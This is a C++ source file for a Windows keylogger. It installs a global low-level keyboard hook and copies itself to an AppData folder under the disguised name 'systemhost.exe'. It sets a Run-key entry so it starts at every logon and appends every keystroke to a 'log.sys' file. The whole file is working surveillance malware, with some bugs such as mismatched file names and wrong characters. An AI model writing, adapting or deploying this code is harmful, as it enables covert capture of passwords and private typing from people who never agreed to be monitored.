#pragma once
#include "framework.h"
#include "resource.h"
#include <Windows.h>
#include <fstream>
#include <iostream>
#include <string>
#include <ctime>
#include <cstdio>

std::string logPath;//Location of log file in the user system
std::string errorLog;//File name of error log TODO

HHOOK callbackhook;//Callback Hook

void enableOnAutoBoot(bool flag);
void createDirectoryAndFiles();
void setLogStorePath();
void preLogTimeEntry();
void startTracker();
void releaseHookRoutine();
void saveStrokes(DWORD vkCode, bool systemCommandFlag);

LRESULT CALLBACK hookCallbackProc(int nCode, WPARAM wParam, LPARAM lParam) {
	KBDLLHOOKSTRUCT keyboardHook = *((KBDLLHOOKSTRUCT*)lParam);
	DWORD vkCode = keyboardHook.vkCode;
	std::string y = std::to_string(vkCode);
	switch (wParam) {
	case WM_KEYDOWN:	saveStrokes(vkCode, false);
		break;
	case WM_SYSKEYDOWN:	saveStrokes(vkCode, true);
		break;
	}
	return CallNextHookEx(callbackhook, nCode, wParam, lParam);
}

DWORD WINAPI setHookRoutine() {
	HINSTANCE hinst = GetModuleHandle(NULL);
	if (hinst != NULL) {
		callbackhook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)hookCallbackProc, hinst, 0);
		MSG message;
		while (GetMessage(&message, NULL, 0, 0) != 0)
		{
			TranslateMessage(&message);
			DispatchMessage(&message);
		}
		releaseHookRoutine();
	}
	return 0;
}

std::string getDayOfWeek(int day) {
	if (day == 0) {
		return "SUNDAY";
	}
	else if (day == 1) {
		return "MONDAY";
	}
	else if (day == 2) {
		return "TUESDAY";
	}
	else if (day == 3) {
		return "WEDNESDAY";
	}
	else if (day == 4) {
		return "THURSDAY";
	}
	else if (day == 5) {
		return "FRIDAY";
	}
	else if (day == 6) {
		return "SATURDAY";
	}

	return "INVALID_DAY";
}

int WINAPI wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ PWSTR pCmdLine, _In_ int nCmdShow) {
	setLogStorePath();
	createDirectoryAndFiles();
	enableOnAutoBoot(true);//Disable Auto Run after Boot by setting false
	preLogTimeEntry();
	startTracker();
	return 0;
}

void setLogStorePath() {
	char lpBuffer[MAX_PATH];//lptstr buffer

	GetEnvironmentVariableA("APPDATA", lpBuffer, MAX_PATH);
	logPath = lpBuffer;
	logPath += "\\WinpmeT\\";
}

void createDirectoryAndFiles() {
	std::string tempLocPath = logPath;
	std::string execFile = tempLocPath;
	execFile += "\\systemhost.exe";
	char lpDir[MAX_PATH];
	GetModuleFileNameA(GetModuleHandle(0), lpDir, MAX_PATH);
	std::string b = lpDir;
	CreateDirectoryA(tempLocPath.c_str(), NULL);
	CopyFileA(b.c_str(), execFile.c_str(), FALSE);
}

void enableOnAutoBoot(bool flag) {
	if (!flag) {
		return;
	}
	char lpData[MAX_PATH];
	HKEY hkeyVar;
	std::string processPath = logPath + "System Host.exe";
	strcpy(lpData, processPath.c_str());
	long a = RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hkeyVar);
	if (a != ERROR_SUCCESS) {
		//TODO Error log
	}
	long b = RegSetValueExA(hkeyVar, "Keytracker", 0, REG_SZ, (const unsigned char*)lpData, MAX_PATH);
	if (b != ERROR_SUCCESS) {
		//TODO Error log
	}
	RegCloseKey(hkeyVar);
}

void preLogTimeEntry() {
	SYSTEMTIME systime;

	GetLocalTime(&systime);
	int second = systime.wSecond;
	int minute = systime.wMinute;
	int hour = systime.wHour;
	int date = systime.wDay;
	int day = systime.wDayOfWeek;
	int month = systime.wMonth;
	int year = systime.wYear;
	std::string timeStamp = "\n------------------------------------\n";
	timeStamp += std::to_string(date) + "-";
	timeStamp += std::to_string(month) + "-";
	timeStamp += std::to_string(year) + " ";
	timeStamp += getDayOfWeek(day) + " ";
	timeStamp += std::to_string(hour) + " : ";
	timeStamp += std::to_string(minute) + " : ";
	timeStamp += std::to_string(second) + "\n-----------------------------------\n";

	char lpDate[MAX_PATH];
	strcpy(lpDate, timeStamp.c_str());
	std::string tempLocPath = logPath;
	char lpDir[MAX_PATH];
	strcpy(lpDir, tempLocPath.c_str());
	strcat(lpDir, "log.sys");
	FILE* tempFile;
	tempFile = fopen(lpDir, "a+");
	if (tempFile != NULL) {
		//TODO
	}
	fputs(lpDate, tempFile);
	fclose(tempFile);
}

void startTracker() {
	HANDLE lpThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)setHookRoutine, NULL, 0, NULL);
	if (lpThread) {
		WaitForSingleObject(lpThread, INFINITE);
	}
	else {
		//Write Error log TODO
	}
}

void releaseHookRoutine() {
	UnhookWindowsHookEx(callbackhook);
}

void saveStrokes(DWORD vkCode, bool systemCommandFlag) {
	std::string tempLocPath = logPath;
	char lpDir[MAX_PATH];
	strcpy(lpDir, tempLocPath.c_str());
	strcat(lpDir, "log.sys");
	FILE* tempFile;
	tempFile = fopen(lpDir, "a+");
	if (!systemCommandFlag) {
		if (!(GetAsyncKeyState(VK_SHIFT))) {
			switch (vkCode) {
			case 0x30:	fputs("0", tempFile);
				break;
			case 0x31:	fputs("1", tempFile);
				break;
			case 0x32:	fputs("2", tempFile);
				break;
			case 0x33:	fputs("3", tempFile);
				break;
			case 0x34:	fputs("4", tempFile);
				break;
			case 0x35:	fputs("5", tempFile);
				break;
			case 0x36:	fputs("6", tempFile);
				break;
			case 0x37:	fputs("7", tempFile);
				break;
			case 0x38:	fputs("8", tempFile);
				break;
			case 0x39:	fputs("9", tempFile);
				break;
			case 0x41:	if (GetKeyState(VK_CAPITAL)) {
				fputs("A", tempFile);
			}
					 else {
				fputs("a", tempFile);
			}
					 break;
			case 0x42:	if (GetKeyState(VK_CAPITAL)) {
				fputs("B", tempFile);
			}
					 else {
				fputs("b", tempFile);
			}
					 break;
			case 0x43:	if (GetKeyState(VK_CAPITAL)) {
				fputs("C", tempFile);
			}
					 else {
				fputs("c", tempFile);
			}
					 break;
			case 0x44:	if (GetKeyState(VK_CAPITAL)) {
				fputs("D", tempFile);
			}
					 else {
				fputs("d", tempFile);
			}
					 break;
			case 0x45:	if (GetKeyState(VK_CAPITAL)) {
				fputs("E", tempFile);
			}
					 else {
				fputs("e", tempFile);
			}
					 break;
			case 0x46:	if (GetKeyState(VK_CAPITAL)) {
				fputs("F", tempFile);
			}
					 else {
				fputs("f", tempFile);
			}
					 break;
			case 0x47:	if (GetKeyState(VK_CAPITAL)) {
				fputs("G", tempFile);
			}
					 else {
				fputs("g", tempFile);
			}
					 break;
			case 0x48:	if (GetKeyState(VK_CAPITAL)) {
				fputs("H", tempFile);
			}
					 else {
				fputs("h", tempFile);
			}
					 break;
			case 0x49:	if (GetKeyState(VK_CAPITAL)) {
				fputs("I", tempFile);
			}
					 else {
				fputs("i", tempFile);
			}
					 break;
			case 0x4A:	if (GetKeyState(VK_CAPITAL)) {
				fputs("J", tempFile);
			}
					 else {
				fputs("j", tempFile);
			}
					 break;
			case 0x4B:	if (GetKeyState(VK_CAPITAL)) {
				fputs("K", tempFile);
			}
					 else {
				fputs("k", tempFile);
			}
					 break;
			case 0x4C:	if (GetKeyState(VK_CAPITAL)) {
				fputs("L", tempFile);
			}
					 else {
				fputs("l", tempFile);
			}
					 break;
			case 0x4D:	if (GetAsyncKeyState(VK_CAPITAL)) {
				fputs("M", tempFile);
			}
					 else {
				fputs("m", tempFile);
			}
					 break;
			case 0x4E:	if (GetKeyState(VK_CAPITAL)) {
				fputs("N", tempFile);
			}
					 else {
				fputs("n", tempFile);
			}
					 break;
			case 0x4F:	if (GetKeyState(VK_CAPITAL)) {
				fputs("O", tempFile);
			}
					 else {
				fputs("o", tempFile);
			}
					 break;
			case 0x50:	if (GetKeyState(VK_CAPITAL)) {
				fputs("P", tempFile);
			}
					 else {
				fputs("p", tempFile);
			}
					 break;
			case 0x51:	if (GetKeyState(VK_CAPITAL)) {
				fputs("Q", tempFile);
			}
					 else {
				fputs("q", tempFile);
			}
					 break;
			case 0x52:	if (GetKeyState(VK_CAPITAL)) {
				fputs("R", tempFile);
			}
					 else {
				fputs("r", tempFile);
			}
					 break;
			case 0x53:	if (GetKeyState(VK_CAPITAL)) {
				fputs("S", tempFile);
			}
					 else {
				fputs("s", tempFile);
			}
					 break;
			case 0x54:	if (GetKeyState(VK_CAPITAL)) {
				fputs("T", tempFile);
			}
					 else {
				fputs("t", tempFile);
			}
					 break;
			case 0x55:	if (GetKeyState(VK_CAPITAL)) {
				fputs("U", tempFile);
			}
					 else {
				fputs("u", tempFile);
			}
					 break;
			case 0x56:	if (GetKeyState(VK_CAPITAL)) {
				fputs("V", tempFile);
			}
					 else {
				fputs("v", tempFile);
			}
					 break;
			case 0x57:	if (GetKeyState(VK_CAPITAL)) {
				fputs("W", tempFile);
			}
					 else {
				fputs("w", tempFile);
			}
					 break;
			case 0x58:	if (GetKeyState(VK_CAPITAL)) {
				fputs("X", tempFile);
			}
					 else {
				fputs("x", tempFile);
			}
					 break;
			case 0x59:	if (GetKeyState(VK_CAPITAL)) {
				fputs("Y", tempFile);
			}
					 else {
				fputs("y", tempFile);
			}
					 break;
			case 0x5A:	if (GetKeyState(VK_CAPITAL)) {
				fputs("Z", tempFile);
			}
					 else {
				fputs("z", tempFile);
			}
					 break;
			case VK_OEM_1:	fputs(";", tempFile);
				break;
			case VK_OEM_2:	fputs("/", tempFile);
				break;
			case VK_OEM_3:	fputs("`", tempFile);
				break;
			case VK_OEM_4:	fputs("[", tempFile);
				break;
			case VK_OEM_5:	fputs("\\", tempFile);
				break;
			case VK_OEM_6:	fputs("]", tempFile);
				break;
			case VK_OEM_7:	fputs("'", tempFile);
				break;
			case VK_OEM_8:	//fputs("", tempFile);
				break;
			case VK_OEM_102:	fputs("<", tempFile);
				break;
			case VK_OEM_PLUS:	fputs("=", tempFile);
				break;
			case VK_OEM_MINUS:	fputs("-", tempFile);
				break;
			case VK_OEM_COMMA:	fputs(",", tempFile);
				break;
			case VK_OEM_PERIOD:	fputs(".", tempFile);
				break;
			}
		}
		if (GetAsyncKeyState(VK_SHIFT)) {
			switch (vkCode) {
			case 0x30:	fputs(")", tempFile);
				break;
			case 0x31:	fputs("!", tempFile);
				break;
			case 0x32:	fputs("@", tempFile);
				break;
			case 0x33:	fputs("#", tempFile);
				break;
			case 0x34:	fputs("$", tempFile);
				break;
			case 0x35:	fputs("%", tempFile);
				break;
			case 0x36:	fputs("^", tempFile);
				break;
			case 0x37:	fputs("&", tempFile);
				break;
			case 0x38:	fputs("*", tempFile);
				break;
			case 0x39:	fputs("(", tempFile);
				break;
			case 0x41:	if (GetKeyState(VK_CAPITAL)) {
				fputs("a", tempFile);
			}
					 else {
				fputs("A", tempFile);
			}
					 break;
			case 0x42:	if (GetKeyState(VK_CAPITAL)) {
				fputs("b", tempFile);
			}
					 else {
				fputs("B", tempFile);
			}
					 break;
			case 0x43:	if (GetKeyState(VK_CAPITAL)) {
				fputs("c", tempFile);
			}
					 else {
				fputs("C", tempFile);
			}
					 break;
			case 0x44:	if (GetKeyState(VK_CAPITAL)) {
				fputs("d", tempFile);
			}
					 else {
				fputs("D", tempFile);
			}
					 break;
			case 0x45:	if (GetKeyState(VK_CAPITAL)) {
				fputs("e", tempFile);
			}
					 else {
				fputs("E", tempFile);
			}
					 break;
			case 0x46:	if (GetKeyState(VK_CAPITAL)) {
				fputs("f", tempFile);
			}
					 else {
				fputs("F", tempFile);
			}
					 break;
			case 0x47:	if (GetKeyState(VK_CAPITAL)) {
				fputs("g", tempFile);
			}
					 else {
				fputs("G", tempFile);
			}
					 break;
			case 0x48:	if (GetKeyState(VK_CAPITAL)) {
				fputs("B", tempFile);
			}
					 else {
				fputs("H", tempFile);
			}
					 break;
			case 0x49:	if (GetKeyState(VK_CAPITAL)) {
				fputs("i", tempFile);
			}
					 else {
				fputs("I", tempFile);
			}
					 break;
			case 0x4A:	if (GetKeyState(VK_CAPITAL)) {
				fputs("j", tempFile);
			}
					 else {
				fputs("J", tempFile);
			}
					 break;
			case 0x4B:	if (GetKeyState(VK_CAPITAL)) {
				fputs("k", tempFile);
			}
					 else {
				fputs("K", tempFile);
			}
					 break;
			case 0x4C:	if (GetKeyState(VK_CAPITAL)) {
				fputs("l", tempFile);
			}
					 else {
				fputs("L", tempFile);
			}
					 break;
			case 0x4D:	if (GetKeyState(VK_CAPITAL)) {
				fputs("m", tempFile);
			}
					 else {
				fputs("M", tempFile);
			}
					 break;
			case 0x4E:	if (GetKeyState(VK_CAPITAL)) {
				fputs("n", tempFile);
			}
					 else {
				fputs("N", tempFile);
			}
					 break;
			case 0x4F:	if (GetKeyState(VK_CAPITAL)) {
				fputs("o", tempFile);
			}
					 else {
				fputs("O", tempFile);
			}
					 break;
			case 0x50:	if (GetKeyState(VK_CAPITAL)) {
				fputs("p", tempFile);
			}
					 else {
				fputs("P", tempFile);
			}
					 break;
			case 0x51:	if (GetKeyState(VK_CAPITAL)) {
				fputs("q", tempFile);
			}
					 else {
				fputs("Q", tempFile);
			}
					 break;
			case 0x52:	if (GetKeyState(VK_CAPITAL)) {
				fputs("r", tempFile);
			}
					 else {
				fputs("R", tempFile);
			}
					 break;
			case 0x53:	if (GetKeyState(VK_CAPITAL)) {
				fputs("s", tempFile);
			}
					 else {
				fputs("S", tempFile);
			}
					 break;
			case 0x54:	if (GetKeyState(VK_CAPITAL)) {
				fputs("t", tempFile);
			}
					 else {
				fputs("T", tempFile);
			}
					 break;
			case 0x55:	if (GetKeyState(VK_CAPITAL)) {
				fputs("u", tempFile);
			}
					 else {
				fputs("U", tempFile);
			}
					 break;
			case 0x56:	if (GetKeyState(VK_CAPITAL)) {
				fputs("v", tempFile);
			}
					 else {
				fputs("V", tempFile);
			}
					 break;
			case 0x57:	if (GetKeyState(VK_CAPITAL)) {
				fputs("w", tempFile);
			}
					 else {
				fputs("W", tempFile);
			}
					 break;
			case 0x58:	if (GetKeyState(VK_CAPITAL)) {
				fputs("x", tempFile);
			}
					 else {
				fputs("X", tempFile);
			}
					 break;
			case 0x59:	if (GetKeyState(VK_CAPITAL)) {
				fputs("y", tempFile);
			}
					 else {
				fputs("Y", tempFile);
			}
					 break;
			case 0x5A:	if (GetKeyState(VK_CAPITAL)) {
				fputs("z", tempFile);
			}
					 else {
				fputs("Z", tempFile);
			}
					 break;
			case VK_OEM_1:	fputs(":", tempFile);
				break;
			case VK_OEM_2:	fputs("?", tempFile);
				break;
			case VK_OEM_3:	fputs("~", tempFile);
				break;
			case VK_OEM_4:	fputs("{", tempFile);
				break;
			case VK_OEM_5:	fputs("|", tempFile);
				break;
			case VK_OEM_6:	fputs("}", tempFile);
				break;
			case VK_OEM_7:	fputs("\"", tempFile);
				break;
			case VK_OEM_8:	//fputs("", tempFile);
				break;
			case VK_OEM_102:	fputs(">", tempFile);
				break;
			case VK_OEM_PLUS:	fputs("+", tempFile);
				break;
			case VK_OEM_MINUS:	fputs("_", tempFile);
				break;
			case VK_OEM_COMMA:	fputs("<", tempFile);
				break;
			case VK_OEM_PERIOD:	fputs(">", tempFile);
				break;
			}
		}
		switch (vkCode) {
		case VK_CAPITAL:	if (!GetKeyState(VK_CAPITAL)) {
			fputs("[CAP'S LOCK ON]", tempFile);
		}
					   else {
			fputs("[CAP'S LOCK OFF]", tempFile);
		}
					   break;
		case 0x80:	fputs("\n[LEFT MOUSE CLICK]\n", tempFile);
			break;
		case VK_RBUTTON:	fputs("\n[RIGHT MOUSE CLICK]\n", tempFile);
			break;
		case VK_MBUTTON:	fputs("\n[MIDDLE MOUSE CLICK]\n", tempFile);
			break;
		case VK_XBUTTON1:	fputs("\n[X1 BUTTON CLICKED]\n", tempFile);
			break;
		case VK_XBUTTON2:	fputs("\n[X2 BUTTON CLICKED]\n", tempFile);
			break;
		case VK_BACK:		fputs("[BACKSPACE]", tempFile);
			break;
		case VK_RETURN:		fputs("[ENTER]", tempFile);
			break;
		case VK_TAB:		fputs("[TAB]", tempFile);
			break;
		case VK_CONTROL:	fputs("[CTRL]", tempFile);
			break;
		case VK_MENU:		fputs("[ALT]", tempFile);
			break;
		case VK_SPACE:		fputs(" ", tempFile);
			break;
		case VK_LEFT:		fputs("[LEFT ARROW]", tempFile);
			break;
		case VK_UP:			fputs("[UP ARROW]", tempFile);
			break;
		case VK_DOWN:		fputs("[DOWN ARROW]", tempFile);
			break;
		case VK_RIGHT:		fputs("[RIGHT ARROW]", tempFile);
			break;
		case VK_SNAPSHOT:	fputs("\n[Screenshot captured]\n", tempFile);
			break;
		case VK_LSHIFT:		if (GetKeyState(VK_SHIFT) & 0x8000) {
			fputs("[LEFT SHIFT]", tempFile);
		}
					  break;
		case VK_RSHIFT:		if (GetKeyState(VK_SHIFT) & 0x8000) {
				fputs("[RIGHT SHIFT]", tempFile);
			}
			break;
		case VK_DELETE:		fputs("[DELETE]", tempFile);
			break;
		case VK_PRINT:		fputs("[PRINT]", tempFile);
			break;
		case VK_HELP:		fputs("[HELP]", tempFile);
			break;
		case VK_SELECT:		fputs("[SELECT]", tempFile);
			break;
		case VK_EXECUTE:	fputs("[EXECUTE]", tempFile);
			break;
		case VK_INSERT:		fputs("[INSERT]", tempFile);
			break;
		case VK_NUMLOCK:	if (!GetKeyState(VK_NUMLOCK)) {
				fputs("[NUM'S LOCK ON]", tempFile);
			}
			else {
				fputs("[NUM'S LOCK OFF]", tempFile);
			}
			break;
		}
		if (GetKeyState(VK_NUMLOCK)) {
			switch (vkCode) {
			case VK_NUMPAD0:	fputs("0", tempFile);
				break;
			case VK_NUMPAD1:	fputs("1", tempFile);
				break;
			case VK_NUMPAD2:	fputs("2", tempFile);
				break;
			case VK_NUMPAD3:	fputs("3", tempFile);
				break;
			case VK_NUMPAD4:	fputs("4", tempFile);
				break;
			case VK_NUMPAD5:	fputs("5", tempFile);
				break;
			case VK_NUMPAD6:	fputs("6", tempFile);
				break;
			case VK_NUMPAD7:	fputs("7", tempFile);
				break;
			case VK_NUMPAD8:	fputs("8", tempFile);
				break;
			case VK_NUMPAD9:	fputs("9", tempFile);
				break;
			case VK_ADD:		fputs("+", tempFile);
				break;
			case VK_SUBTRACT:	fputs("-", tempFile);
				break;
			case VK_MULTIPLY:	fputs("*", tempFile);
				break;
			case VK_DIVIDE:		fputs("/", tempFile);
				break;
			case VK_DECIMAL:	fputs(".", tempFile);
				break;
			case VK_SEPARATOR:	fputs("[SEPERATOR]", tempFile);
				break;
			}
		}
	}
	else {
		if (GetAsyncKeyState(VK_MENU)) {
			switch (vkCode) {
				case VK_TAB:	fputs("[Switch Window]", tempFile);
					break;
				//TODO
				default:	fputs("[Some System Command]", tempFile);
			}
		}

		if (GetAsyncKeyState(VK_F10)) {
			fputs("[Opened Menu in current App]", tempFile);
		}
	}
	fclose(tempFile);
}
